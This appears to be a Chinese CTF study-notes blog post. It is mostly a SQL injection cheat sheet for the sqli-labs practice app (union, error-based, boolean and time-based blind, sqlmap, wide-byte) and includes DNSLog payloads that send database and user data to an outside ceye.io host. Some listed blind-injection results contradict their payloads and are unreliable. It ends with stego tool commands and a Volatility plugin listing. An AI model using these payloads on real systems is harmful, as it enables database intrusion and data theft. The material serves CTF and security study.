---
layout: _post
title: CTF 笔记（持续完善）
date: 2024-06-19 22:59:14
# 标签
tags: 
    - 网络安全
    - CTF
# 分类
categories: 
    # 主类
    - 网络安全
    # 子类
    - CTF
---

# CTF 笔记（持续完善）

## 一、SQL注入

### 1、SQL注入分类
#### 1、根据用户传入参数类型分类、

1. 字符型注入:需要使用 单引号 或 双引号 闭合
2. 数值型注入：直接进行注入，无需闭合
3. 搜索型注入：适用于一些搜索功能(搜索框) like 模糊匹配

#### 2、根据攻击方式分类
1. 联合查询注入
2. 报错注入
3. 盲注：
   1. 基于布尔的盲注
   2. 基于时间的盲注

4. DNSLog 注入
5. 堆叠注入
6. 二次注入
7. 宽字节注入

#### 3、根据http头位置
1. GET 型注入
2. POST 型注入
3. Cookie 型注入
4. User-Agent 注入
5. Referer 注入	

### 2、漏洞利用方式

#### 1. 联合查询注入

##### 1. 判断注入点

```
?id=1'
?id=1\
?id=1' and 1=1#
?id=1' and 1=2#
?id=1' or 1=2#
?id=1' and 1=1#
```

##### 2. 判断字段数

```
?id=1' order by 5#
```

##### 3. 查看显示位

```
?id=-1' union select 1,2,3#
```

##### 4. 查询数据库名

```
?id=-1%20union%20select%201,database(),version()--+
```

##### 5. 查询表名

```
?id=-1%20union%20select%201,group_concat(table_name),version() from information_schema.tables--+
?id=-1%20union%20select%201,group_concat(table_name),version()%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
```

> 示例表名：emails,referers,test1,uagents,users

##### 6. 查询字段名

```
?id=-1 union select 1,group_concat(column_name),version() from information_schema.columns where table_schema='security' and table_name='users'--+
```

> 示例字段名：id,username,password

##### 7. 查询数据

```
?id=-1 union select 1,group_concat(username),group_concat(password) from security.users--+
```



#### 2. 报错注入（默认显示32个字符）

> extractValue、Floor、updatexml

##### 1、函数详解：
​	updatexml()函数：
​		updatexml()函数的作用就是改变（查找并替换）xml文档中符合条件的节点的值
​		语法：updatexml(xml_document,XPathstring,new_value)
​			第一个参数是字符串string(XML文档对象的名称)
​			第二个参数是指定字符串中的一个位置（Xpath格式的字符串）
​			第三个参数是将要替换成什么，string格式
​			Xpath定位必须是有效的，否则则会发生错误。我们就能利用这个特性爆出我们想要的数据
​	extractvalue()函数：
​		extractvalue()函数的作用是从目标xml中返回包含所查询值的字符串
​		语法：extractvalue (XML_document, XPath_string);
​		第一个参数：XML_document是String格式，为XML文档对象的名称，文中为doc
​		第二个参数：XPath_string(Xpath格式的字符串)，Xpath定位必须是有效的，否则会发生错误
​	floor()函数
​		floor()是mysql的一个取整函数

##### 2、updatexml报错注入流程：

1. 判断注入点
2. 查询数据库名：

```
1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)#
```

3. 查询表名

  ```
  1%20and%20updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)#
  ```

4.  查询字段名

```
1%20and%20updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1)#
```

5. 查询数据

```
1%20and%20updatexml(1,concat(0x7e,(select group_concat(username) from security.users),0x7e),1)#
```

##### 3、extractValue注入

1. 判断注入点

2. 获取数据库名

   ```
   ?id=1' and extractvalue(1,concat(0x23,(select database()),0x23))--+
   ```

3. 获取表名

   ```
   1%20and extractValue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))%23
   ```

4. 获取字段名

   ```
   1%20and extractValue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='emails'),0x7e))%23
   ```

5. 获取数据

   ```
   1%20and%20updatexml(1,concat(0x7e,(select group_concat(email_id) from security.emails),0x7e))#
   ```

##### 4、Floor注入

1. 执行语句时创建虚拟表

   ```
   select 1,count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
   ```

2. 执行如下报错语句，尝试获取数据库名：

   ```
   ?id=-1' union select count(*),1, concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+
   ```

3. 查看表名

   ```
   ?id=1' union SELECT count(*),1,concat((select table_name from information_schema.tables where table_schema='security'limit 0,1),floor(rand()*2))as a from information_schema.tables group by a--+
   ```

4. 查看字段名

   ```
   ?id=1' union SELECT null,count(*),concat((select column_name from information_schema.columns where table_name='users' limit 2,1),floor(rand()*2))as a from information_schema.tables group by a%23
   ```

5. 查看数据

   ```
   ?id=1' union SELECT null,count(*),concat((select password from security.users limit 2,1),floor(rand()*2))as a from information_schema.tables group by a%23
   ```

##### 5、exp()函数 
> 当传递一个大于709的值时，函数exp()就会引起一个溢出错误。



#### 3、SQL注入盲注（盲注）

##### 1. 布尔盲注

盲注是在不知道数据库返回值的情况下，对数据中的内容进行猜测。基于布尔值的盲注，主要是利用页面返回 `True` 或 `False` 来得到数据库中的相关信息。

###### 布尔盲注攻击流程：

1. 判断数据库名长度
2. 猜解数据库内容【利用 ASCII 对比】
3. 判断数据库中表的数量
4. 判断第 n 张表名的长度
5. 猜解第 n 张表名的字符串内容
6. 判断指定表有多少字段
7. 判断第 n 列的字段长度
8. 猜解第 n 列的字段名内容
9. 判断指定字段对应的字段值内容长度
10. 猜解指定字段对应的字段值

###### Payload 示例：

1. 判断数据库名长度

```sql
?id=1' and length(database())=5 %23
```

结果：

```
8
```

2. 猜解数据库第一位【利用 ASCII 对比】

```sql
?id=2' and ascii(substr(database(),1,1))=119 %23
```

结果：

```
security
```

3. 判断数据库表数量

```sql
?id=2' and (select count(*) from information_schema.tables where table_schema=database())=7 %23
```

结果：

```
5
```

4. 判断第一张表名的长度

```sql
?id=2' and (select length(table_name) from information_schema.tables where table_schema='security' limit 0,1)=9 %23
```

结果：

```
8
```

5. 判断第二张表名的长度

```sql
?id=2' and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=8 %23
```

结果：

```
5
```

6. 猜解第一个表名的第一个字符串内容

```sql
?id=2' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 %23
```

7. 猜解第二个表名的第二个字符串内容

```sql
?id=2' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=111 %23
```

结果：

```
env_list
```

8. 判断特定表有多少字段

```sql
?id=2' and (select count(column_name) from information_schema.columns where table_name='env_list')=8 %23
```

结果：

```
2
```

9. 判断第一个列名字符长度

```sql
?id=2' and (select length(column_name) from information_schema.columns where table_name='emails' limit 0,1)=2 %23
```

10. 判断第二个列名字符长度

```sql
?id=2' and (select length(column_name) from information_schema.columns where table_name='emails' limit 1,1)=7 %23
```

11. 猜解第五个列名，第一个字符的 ASCII

```sql
?id=2' and ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 5,1),1,1))=101 %23
```

12. 猜解第五个列名，第二个字符的 ASCII

```sql
?id=2' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 5,1),2,1))=101 %23
```

结果：

```
email_id
```

13. 判断 envflag 字段有多少条数据

```sql
?id=2' and (select count(email_id) from emails)=20 %23
```

结果：

```
8
```

14. 判断 envflag 字段第一条数据有多少字符

```sql
?id=2' and (select length(email_id) from emails limit 0,1)=16 %23
```

结果：

```
16
```

15. 判断 envflag 字段第二条字段有多少字符

```sql
?id=2' and (select length(envFlag) from env_list limit 1,1)=9 %23
```

16. 猜解字段第一个字符内容【第二条数据】

```sql
?id=2' and ascii(substr((select email_id from emails limit 0,1),1,1))=102 %23
```

17. 猜解字段第二个字符内容【第二条数据】

```sql
?id=2' and ascii(substr((select envFlag from env_list limit 1,1),2,1))=102 %23
```

##### 2. 时间盲注

基于时间盲注的一般思路是延迟注入，通过使用 `sleep()` 或 `benchmark()` 等函数让 MySQL 执行时间变长，并结合判断条件语句 `if(expr1,expr2,expr3)`，通过页面响应时间长短来判断语句返回值是 `TRUE` 还是 `FALSE`，从而猜解一些未知字段。

###### 注入流程（以获取数据库版本信息为例）：

1. 确定注入点及注入类型
2. 使用 `if` 判断语句，猜测 `version()` 的长度并用 `sleep` 函数作为判断依据
3. 重复步骤 2 直至获取真正长度
4. 使用 `if` 判断语句，猜测 `version()` 的第一个字符的 ASCII 码并使用 `sleep` 函数作为判断依据构造注入语句
5. 重复步骤 4，直至获取全部长度的版本字符的 ASCII 码

####### 常用的判断语句：

```sql
' and sleep(10)%23
' and if(1=0,1, sleep(10)) --+
" and if(1=0,1, sleep(10)) --+
) and if(1=0,1, sleep(10)) --+
') and if(1=0,1, sleep(10)) --+
") and if(1=0,1, sleep(10)) --+
```

由于不知道对方站点使用什么符号闭合，可使用 BurpSuite，fuzz 测试一下常用闭合符号。

###### Payload 示例：

1. 猜解数据库长度

```sql
?id=1' and sleep(if(length(database())=5,5,0))--+
```

2. 猜解数据库名内容

```sql
1' and if(ascii(substr(database(),1,1))=119,sleep(3),1)%23    # 第一个字符
1' and if(ascii(substr(database(),2,1))=101,sleep(3),1)%23    # 第二个字符....
```

3. 判断当前数据库表数量

```sql
1' and if((select count(*) from information_schema.tables where table_schema=database())=7,sleep(3),1)%23
```

4. 判断表名长度

```sql
1' and if((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=9,sleep(3),1)%23    # 第一张
1' and if((select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=8,sleep(3),1)%23    # 第二张....
```

5. 猜解表名内容

```sql
1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),1)%23    # 第一个表名
1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=101,sleep(3),1)%23    # 第二个表名....
```

6. 判断指定表 “env_list” 有多少字段

```sql
1' and if((select count(column_name) from information_schema.columns where table_name='env_list')=8,sleep(3),1)%23
```

7. 判断表的第一个字段长度

```sql
1' and if((select length(column_name) from information_schema.columns where table_name='env_list' limit 0,1)=2,sleep(3),1)%23
```

8. 猜解第一个列名，第一个字符的 ASCII

```sql
1' and if(ascii(substr((select column_name from information_schema.columns where table_name='env_list' limit 5,1),1,1))=101,sleep(3),1)%23
```

9. 判断 envFlag 字段有多少条记录

```sql
1' and if((select count(envFlag) from env_list)=20,sleep(3),1)%23
```

10. 判断 envFlag 字段第三条多少个字符

```sql
1' and if((select length(envFlag) from env_list limit 2,1)=9,sleep(3),1)%23
```

11. 猜解指定字段第 3 条记录的内容

    ```
    1' and if(ascii(substr((select envFlag from env_list limit 2,1),1,1))=103,sleep(3),1)%23
    1' and if(ascii(substr((select envFlag from env_list limit 2,1),2,1))=102,sleep(3),1)%23
    ```

#### 4、SQLMap使用方式：

1. 判断注入点

   ```
   python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1* --batch
   ```

2. 获取数据库名

   ```
   python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1* --batch --dbs
   ```

3. 获取表名

   ```
   python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1* --batch -D vuldemo --tables
   ```

4. 获取字段名

   ```
   python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1* --batch -D vuldemo -T user --columns
   ```

5. 获取数据

   ```
   python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1* --batch -D vuldemo -T user -C name,password,username --dump
   ```

   > -r 参数，指定HTTP数据包文件，并执行注入。(注意：将要测试的位置后面加一个*星号，表示测试该位置)
   >
   > --data=username*

#### 5、DNSLog注入：

1. 解决网页无回显、无报错，且需要大量请求的问题。

	2. 利用条件：
		1-仅支持目标服务器为Windows的系统: UNC机制
		2-需要具备数据库的root权限
		3-需要MySQL开启配置secure_file_priv=
		4-存在注入点
	
	3. 利用原理和方式Payload：
	
	   ```
	   ?id=1' and (select load_file(concat('\\\\',(select hex(user())),'.vq27o3.ceye.io/abc'))) --+
	   ?id=1' and (select load_file(concat('\\\\',(select database()),'.vq27o3.ceye.io/abc'))) --+
	   ?id=1' and (select load_file(concat('\\\\',(select concat(database(),version())),'.vq27o3.ceye.io/abc')))--+
	   ?id=1' and (select load_file(concat('\\\\',(select hex(user())),'.vq27o3.ceye.io/abc'))) --+
	   ```

#### 6、宽字节注入：

```
?id=abc
?id=abc' and 1=1#
?id=abc\' and 1=1#
?id=abc%df%53' and 1=1#
?id=abc发' and 1=1#	
```

## XSS

## SSRF

## 文件包含

?w=php://filter/read=convert.base64-encode/resource=./index.php

## 文件上传

## 命令执行

## 图片隐写

```
exiftool xxx
strings xxx
binwalk xxx
binwalk -e xxx
foremost xxx

BlindEaterMark https://github.com/chishaxie/BlindWaterMark
LSP 
	Zsteg 
		使用：zsteg 1.png
		尝试所有方法：zsteg -a 1.png
		提取出发现隐写的文件：zsteg -e extradata:0 misc17.png > 1.txt或zsteg -e 2b,b,lsb,xy misc17.png > 1.txt
	Stegsolve http://www.caesum.com/handbook/Stegsolve.jar
```



## 内存取证-Win

> https://github.com/volatilityfoundation/volatility3/

```
Volatility Foundation Volatility Framework 2.6
用法： Volatility - 内存取证分析平台
 
Options:
  -h, --help            列出所有可用选项及其默认值
                        默认值可以在配置文件中设置
                        (/etc/volatilityrc)
  --conf-file=/home/kali/.volatilityrc
                        基于用户的配置文件
  -d, --debug           调试Volatility
  --plugins=PLUGINS     要使用的其他插件目录（冒号分隔）
  --info                打印所有注册对象的信息
  --cache-directory=/home/kali/.cache/volatility
                        存放缓存文件的目录
  --cache               使用缓存
  --tz=TZ               设置 (Olson) 时区以使用 pytz（如果已安装）或 tzset 显示时间戳
  -f FILENAME, --filename=FILENAME
                        打开图像时使用的文件名
  --profile=WinXPSP2x86
                        要加载的配置文件的名称（使用 --info 查看支持的配置文件列表）
  -l LOCATION, --location=LOCATION
                        从中加载地址空间的 URN 位置
  -w, --write           启用写支持
  --dtb=DTB             DTB 地址
  --shift=SHIFT         Mac KASLR 移位地址
  --output=text         以这种格式输出（支持特定于模块，请参阅下面的模块输出选项）
  --output-file=OUTPUT_FILE
                        在此文件中写入输出
  -v, --verbose         详细信息
  -g KDBG, --kdbg=KDBG  指定一个 KDBG 虚拟地址（注意：对于 64 位 Windows 8 及更高版本，这是 KdCopyDataBlock 的地址）
  --force               强制使用可疑配置文件
  -k KPCR, --kpcr=KPCR  指定特定的 KPCR 地址
  --cookie=COOKIE       指定 nt!ObHeaderCookie 的地址（仅适用于 Windows 10）
 
	支持的插件命令:
 
		amcache        	查看AmCache应用程序痕迹信息
		apihooks       	检测内核及进程的内存空间中的API hook
		atoms          	列出会话及窗口站atom表
		atomscan       	Atom表的池扫描(Pool scanner)
		auditpol       	列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息
		bigpools       	使用BigPagePoolScanner转储大分页池(big page pools)
		bioskbd        	从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)
		cachedump      	获取内存中缓存的域帐号的密码哈希
		callbacks      	打印全系统通知例程
		clipboard      	提取Windows剪贴板中的内容
		cmdline        	显示进程命令行参数
		cmdscan        	提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）
		connections    	打印系统打开的网络连接(仅支持Windows XP 和2003)
		connscan       	打印TCP连接信息
		consoles       	提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）
		crashinfo      	提取崩溃转储信息
		deskscan       	tagDESKTOP池扫描(Poolscaner)
		devicetree     	显示设备树信息
		dlldump        	从进程地址空间转储动态链接库
		dlllist        	打印每个进程加载的动态链接库列表
		driverirp      	IRP hook驱动检测
		drivermodule   	关联驱动对象至内核模块
		driverscan     	驱动对象池扫描
		dumpcerts      	提取RAS私钥及SSL公钥
		dumpfiles      	提取内存中映射或缓存的文件
		dumpregistry   	转储内存中注册表信息至磁盘
		editbox        	查看Edit编辑控件信息 (Listbox正在实验中)
		envars         	显示进程的环境变量
		eventhooks     	打印Windows事件hook详细信息
		evtlogs        	提取Windows事件日志（仅支持XP/2003)
		filescan       	提取文件对象（file objects）池信息
		gahti          	转储用户句柄（handle）类型信息
		gditimers      	打印已安装的GDI计时器(timers)及回调(callbacks)
		gdt            	显示全局描述符表(Global Deor Table)
		getservicesids 	获取注册表中的服务名称并返回SID信息
		getsids        	打印每个进程的SID信息
		handles        	打印每个进程打开的句柄的列表
		hashdump       	转储内存中的Windows帐户密码哈希(LM/NTLM)
		hibinfo        	转储休眠文件信息
		hivedump       	打印注册表配置单元信息
		hivelist       	打印注册表配置单元列表
		hivescan       	注册表配置单元池扫描
		hpakextract    	从HPAK文件（Fast Dump格式）提取物理内存数据
		hpakinfo       	查看HPAK文件属性及相关信息
		idt            	显示中断描述符表(Interrupt Deor Table)
		iehistory      	重建IE缓存及访问历史记录
		imagecopy      	将物理地址空间导出原生DD镜像文件
		imageinfo      	查看/识别镜像信息
		impscan        	扫描对导入函数的调用
		joblinks       	打印进程任务链接信息
		kdbgscan       	搜索和转储潜在KDBG值
		kpcrscan       	搜索和转储潜在KPCR值
		ldrmodules     	检测未链接的动态链接DLL
		lsadump        	从注册表中提取LSA密钥信息（已解密）
		machoinfo      	转储Mach-O 文件格式信息
		malfind        	查找隐藏的和插入的代码
		mbrparser      	扫描并解析潜在的主引导记录(MBR)
		memdump        	转储进程的可寻址内存
		memmap         	打印内存映射
		messagehooks   	桌面和窗口消息钩子的线程列表
		mftparser      	扫描并解析潜在的MFT条目
		moddump        	转储内核驱动程序到可执行文件的示例
		modscan        	内核模块池扫描
		modules        	打印加载模块的列表
		multiscan      	批量扫描各种对象
		mutantscan     	对互斥对象池扫描
		notepad        	查看记事本当前显示的文本
		objtypescan    	扫描窗口对象类型对象
		patcher        	基于页面扫描的补丁程序内存
		poolpeek       	可配置的池扫描器插件
		printkey       	打印注册表项及其子项和值
		privs          	显示进程权限
		procdump       	进程转储到一个可执行文件示例
		pslist         	按照EPROCESS列表打印所有正在运行的进程
		psscan         	进程对象池扫描
		pstree         	以树型方式打印进程列表
		psxview        	查找带有隐藏进程的所有进程列表
		qemuinfo       	转储 Qemu 信息
		raw2dmp        	将物理内存原生数据转换为windbg崩溃转储格式
		screenshot     	基于GDI Windows的虚拟屏幕截图保存
		servicediff    	Windows服务列表(ala Plugx)
		sessions       	_MM_SESSION_SPACE的详细信息列表(用户登录会话)
		shellbags      	打印Shellbags信息
		shimcache      	解析应用程序兼容性Shim缓存注册表项
		shutdowntime   	从内存中的注册表信息获取机器关机时间
		sockets        	打印已打开套接字列表
		sockscan       	TCP套接字对象池扫描
		ssdt           	显示SSDT条目
		strings        	物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)
		svcscan        	Windows服务列表扫描
		symlinkscan    	符号链接对象池扫描
		thrdscan       	线程对象池扫描
		threads        	调查_ETHREAD 和_KTHREADs
		timeliner      	创建内存中的各种痕迹信息的时间线
		timers         	打印内核计时器及关联模块的DPC
		truecryptmaster	Recover 	恢复TrueCrypt 7.1a主密钥
		truecryptpassphrase		查找并提取TrueCrypt密码
		truecryptsummary	TrueCrypt摘要信息
		unloadedmodules	打印卸载的模块信息列表
		userassist     	打印注册表中UserAssist相关信息
		userhandles    	转储用户句柄表
		vaddump        	转储VAD数据为文件
		vadinfo        	转储VAD信息
		vadtree        	以树形方式显示VAD树信息
		vadwalk        	显示遍历VAD树
		vboxinfo       	转储Virtualbox信息（虚拟机）
		verinfo        	打印PE镜像中的版本信息
		vmwareinfo     	转储VMware VMSS/VMSN 信息
		volshell       	内存镜像中的shell
		windows        	打印桌面窗口(详细信息)
		wintree        	Z顺序打印桌面窗口树
		wndscan        	池扫描窗口站
		yarascan       	以Yara签名扫描进程或内核内存
```

输入***\*`vol.py --info`\****可查看插件。

```
Volatility Foundation Volatility Framework 2.6
 
Profiles
--------
VistaSP0x64           - Windows Vista SP0 x64 的配置文件
VistaSP0x86           - Windows Vista SP0 x86 的配置文件
VistaSP1x64           - Windows Vista SP1 x64 的配置文件
VistaSP1x86           - Windows Vista SP1 x86 的配置文件
VistaSP2x64           - Windows Vista SP1 x86 的配置文件
VistaSP2x86           - Windows Vista SP2 x64 的配置文件 
Win10x64              - Windows 10 x64 的配置文件 
Win10x64_10586        - Windows 10 x64 的配置文件 (10.0.10586.306 / 2016-04-23)
Win10x64_14393        - Windows 10 x64 的配置文件 (10.0.14393.0 / 2016-07-16)
Win10x86              - Windows 10 x86 的配置文件
Win10x86_10586        - Windows 10 x86 的配置文件 (10.0.10586.420 / 2016-05-28)
Win10x86_14393        - Windows 10 x86 的配置文件 (10.0.14393.0 / 2016-07-16)
Win2003SP0x86         - Windows 2003 SP0 x86 的配置文件
Win2003SP1x64         - Windows 2003 SP0 x86 的配置文件
Win2003SP1x86         - Windows 2003 SP1 x86 的配置文件 
Win2003SP2x64         - Windows 2003 SP1 x86 的配置文件 
Win2003SP2x86         - Windows 2003 SP2 x86 的配置文件 
Win2008R2SP0x64       - Windows 2008 R2 SP0 x64 的配置文件
Win2008R2SP1x64       - Windows 2008 R2 SP1 x64 的配置文件
Win2008R2SP1x64_23418 - Windows 2008 R2 SP1 x64 的配置文件 (6.1.7601.23418 / 2016-04-09)
Win2008SP1x64         - Windows 2008 SP1 x64 的配置文件
Win2008SP1x86         - Windows 2008 SP1 x86 的配置文件
Win2008SP2x64         - Windows 2008 SP2 x64 的配置文件
Win2008SP2x86         - Windows 2008 SP2 x86 的配置文件
Win2012R2x64          - Windows Server 2012 R2 x64 的配置文件
Win2012R2x64_18340    - Windows Server 2012 R2 x64 的配置文件 (6.3.9600.18340 / 2016-05-13)
Win2012x64            - Windows Server 2012 x64 的配置文件
Win2016x64_14393      - Windows Server 2016 x64 的配置文件 (10.0.14393.0 / 2016-07-16)
Win7SP0x64            - Windows 7 SP0 x64 的配置文件
Win7SP0x86            - Windows 7 SP0 x86 的配置文件
Win7SP1x64            - Windows 7 SP1 x64 的配置文件
Win7SP1x64_23418      - Windows 7 SP1 x64 的配置文件 (6.1.7601.23418 / 2016-04-09)
Win7SP1x86            - Windows 7 SP1 x86 的配置文件
Win7SP1x86_23418      - Windows 7 SP1 x86 的配置文件 (6.1.7601.23418 / 2016-04-09)
Win81U1x64            - Windows 8.1 更新 1 x64 的配置文件
Win81U1x86            - Windows 8.1 更新 1 x86 的配置文件
Win8SP0x64            - Windows 8 x64 的配置文件
Win8SP0x86            - Windows 8 x86 的配置文件
Win8SP1x64            - Windows 8.1 x64 的配置文件
Win8SP1x64_18340      - Windows 8.1 x64 的配置文件 (6.3.9600.18340 / 2016-05-13)
Win8SP1x86            - Windows 8.1 x86 的配置文件
WinXPSP1x64           - Windows XP SP1 x64 的配置文件
WinXPSP2x64           - Windows XP SP2 x64 的配置文件
WinXPSP2x86           - Windows XP SP2 x86 的配置文件
WinXPSP3x86           - Windows XP SP3 x86 的配置文件
 
 
Address Spaces
--------------
AMD64PagedMemory              - 标准 AMD 64 位地址空间
ArmAddressSpace               - ARM 处理器的地址空间
FileAddressSpace              - 这是一个直接文件 AS.
HPAKAddressSpace              - 此 AS 支持 HPAK 格式
IA32PagedMemory               - 标准 IA-32 分页地址空间
IA32PagedMemoryPae            - 此类实现 IA-32 PAE 分页地址空间
LimeAddressSpace              - Lime 的地址空间
LinuxAMD64PagedMemory         - Linux 特定的 AMD 64 位地址空间
MachOAddressSpace             - mach-o 文件的地址空间以支持 atc-ny 内存读取器
OSXPmemELF                    - 这个 AS 支持 VirtualBox ELF64 coredump 格式
QemuCoreDumpElf               - 这个 AS 支持 Qemu ELF32 和 ELF64 核心转储格式
VMWareAddressSpace            - 此 AS 支持 VMware 快照 (VMSS) 和保存状态 (VMSS) 文件 
VMWareMetaAddressSpace        - 此 AS 支持带有 VMSN/VMSS 元数据的 VMEM 格式 
VirtualBoxCoreDumpElf64       - 这个 AS 支持 VirtualBox ELF64 coredump 格式
Win10AMD64PagedMemory         - Windows 10 特定的 AMD 64 位地址空间
WindowsAMD64PagedMemory       - Windows 特定的 AMD 64 位地址空间
WindowsCrashDumpSpace32       - 这个 AS 支持 windows 崩溃转储格式
WindowsCrashDumpSpace64       - 此 AS 支持 windows Crash Dump 格式
WindowsCrashDumpSpace64BitMap - 此 AS 支持 Windows BitMap Crash Dump 格式
WindowsHiberFileSpace32       - 这是 Windows 休眠文件的休眠地址空间
 
 
Plugins
-------
amcache                    - 打印 AmCache 信息 
apihooks                   - 检测进程和内核内存中的 API 挂钩 
atoms                      - 打印会话和窗口站原子表
atomscan                   - 原子表的池扫描器
auditpol                   - 从 HKLM\SECURITY\Policy\PolAdtEv 打印出审计策略 
bigpools                   - 使用 BigPagePoolScanner 转储大页面池 
bioskbd                    - 从实模式内存中读取键盘缓冲区
cachedump                  - 从内存中转储缓存的域哈希
callbacks                  - 打印系统范围的通知例程
clipboard                  - 提取 Windows 剪贴板的内容
cmdline                    - 显示进程命令行参数
cmdscan                    - 通过扫描 _COMMAND_HISTORY 来提取命令历史记录
connections                - 打印打开的连接列表 [仅限 Windows XP 和 2003]
connscan                   - 用于 tcp 连接的池扫描器
consoles                   - 通过扫描 _CONSOLE_INFORMATION 提取命令历史记录
crashinfo                  - 转储崩溃转储信息
deskscan                   - tagDESKTOP（台式机）的 Poolscaner
devicetree                 - 显示设备树
dlldump                    - 从进程地址空间转储 DLL
dlllist                    - 打印每个进程加载的 dll 列表
driverirp                  - 驱动程序 IRP 挂钩检测
drivermodule               - 将驱动程序对象关联到内核模块
driverscan                 - 驱动程序对象的池扫描器
dumpcerts                  - 转储 RSA 私有和公共 SSL 密钥
dumpfiles                  - 提取内存映射和缓存文件
dumpregistry               - 将注册表文件转储到磁盘
editbox                    - 显示有关编辑控件的信息（列表框实验）
envars                     - 显示进程环境变量
eventhooks                 - 在 Windows 事件挂钩上打印详细信息
evtlogs                    - 提取 Windows 事件日志（仅限 XP/2003）
filescan                   - 文件对象的池扫描器
gahti                      - 转储 USER 句柄类型信息
gditimers                  - 打印已安装的 GDI 计时器和回调
gdt                        - 显示全局描述符表
getservicesids             - 获取 Registry 中的服务名称并返回计算的 SID
getsids                    - 打印拥有每个进程的 SID
handles                    - 打印每个进程的打开句柄列表
hashdump                   - 从内存中转储密码哈希 (LM/NTLM)
hibinfo                    - 转储休眠文件信息
hivedump                   - 打印注册表
hivelist                   - 打印注册表配置单元列表
hivescan                   - 注册表配置单元的池扫描程序
hpakextract                - 从 HPAK 文件中提取物理内存 
hpakinfo                   - 有关 HPAK 文件的信息 
idt                        - 显示中断描述符表 
iehistory                  - 重建 Internet Explorer 缓存/历史 
imagecopy                  - 将物理地址空间复制为原始 DD 映像
imageinfo                  - 识别图像的信息 
impscan                    - 扫描对导入函数的调用
joblinks                   - 打印进程作业链接信息 
kdbgscan                   - 搜索和转储潜在的 KDBG 值 
kpcrscan                   - 搜索和转储潜在的 KPCR 值
ldrmodules                 - 检测未链接的 DLL 
limeinfo                   - 转储 Lime 文件格式信息
linux_apihooks             - 检查用户态 apihooks 
linux_arp                  - 打印 ARP 表 
linux_aslr_shift           - 自动检测 Linux ASLR shift 
linux_banner               - 打印 Linux 横幅信息
linux_bash                 - 从 bash 进程内存中恢复 bash 历史记录
linux_bash_env             - 恢复进程的动态环境变量
linux_bash_hash            - 从 bash 进程内存中恢复 bash 哈希表 
linux_check_afinfo         - 验证网络协议的操作函数指针
linux_check_creds          - 检查是否有进程共享凭证结构
linux_check_evt_arm        - 检查异常向量表以查找系统调用表挂钩 
linux_check_fop            - 检查 rootkit 修改的文件操作结构
linux_check_idt            - 检查 IDT 是否已被更改
linux_check_inline_kernel  - 检查内联内核挂钩
linux_check_modules        - 将模块列表与 sysfs 信息进行比较（如果可用）
linux_check_syscall        - 检查系统调用表是否已更改
linux_check_syscall_arm    - 检查系统调用表是否已更改
linux_check_tty            - 检查 tty 设备的钩子
linux_cpuinfo              - 打印每个活动处理器的信息 
linux_dentry_cache         - 从 dentry 缓存中收集文件 
linux_dmesg                - 收集 dmesg 缓冲区
linux_dump_map             - 将选定的内存映射写入磁盘
linux_dynamic_env          - 恢复进程的动态环境变量
linux_elfs                 - 在进程映射中查找 ELF 二进制文件 
linux_enumerate_files      - 列出文件系统缓存引用的文件 
linux_find_file            - 列出并从内存中恢复文件 
linux_getcwd               - 列出每个进程的当前工作目录 
linux_hidden_modules       - 雕刻内存以查找隐藏的内核模块 
linux_ifconfig             - 收集活动接口 
linux_info_regs            - 就像 GDB 中的“信息寄存器”。 它打印出所有
linux_iomem                - 提供类似于 /proc/iomem 的输出
linux_kernel_opened_files  - 列出从内核中打开的文件 
linux_keyboard_notifiers   - 解析键盘通知器调用链 
linux_ldrmodules           - 将 proc 映射的输出与 libdl 中的库列表进行比较
linux_library_list         - 列出加载到进程中的库 
linux_librarydump          - 将进程内存中的共享库转储到磁盘 
linux_list_raw             - 列出具有混杂套接字的应用程序 
linux_lsmod                - 收集加载的内核模块 
linux_lsof                 - 列出文件描述符及其路径 
linux_malfind              - 寻找可疑的进程映射 
linux_memmap               - 转储 linux 任务的内存映射 
linux_moddump              - 提取加载的内核模块 
linux_mount                - 收集挂载的 fs/devices
linux_mount_cache          - 从 kmem_cache收集挂载的 fs/devices
linux_netfilter            - 列出 Netfilter 钩子
linux_netscan              - 雕刻网络连接结构 
linux_netstat              - 列出打开的套接字 
linux_pidhashtable         - 通过 PID 哈希表枚举进程 
linux_pkt_queues           - 将每个进程的数据包队列写入磁盘
linux_plthook              - 扫描 ELF 二进制文件的 PLT 以获取非需要图像的挂钩
linux_proc_maps            - 收集进程内存映射 
linux_proc_maps_rb         - 通过映射红黑树为 linux 收集进程映射
linux_procdump             - 将进程的可执行映像转储到磁盘 
linux_process_hollow       - 检查进程空心的迹象 
linux_psaux                - 收集进程以及完整的命令行和开始时间 
linux_psenv                - 收集进程及其静态环境变量 
linux_pslist               - 通过遍历 task_struct->task 列表来收集活动任务
linux_pslist_cache         - 从 kmem_cache 收集任务
linux_psscan               - 扫描进程的物理内存
linux_pstree               - 显示进程之间的父/子关系
